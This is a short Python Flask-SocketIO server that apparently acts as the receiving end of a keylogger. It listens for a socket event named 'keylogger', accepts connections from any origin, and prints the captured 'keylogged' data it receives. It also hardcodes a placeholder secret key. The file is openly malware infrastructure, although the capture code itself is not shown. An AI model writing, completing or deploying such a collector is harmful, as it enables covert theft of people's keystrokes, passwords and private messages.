from flask import Flask, render_template
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

@socketio.on('keylogger')
def test_connect(data):
    print(data["keylogged"])


if __name__ == '__main__':
    app.run()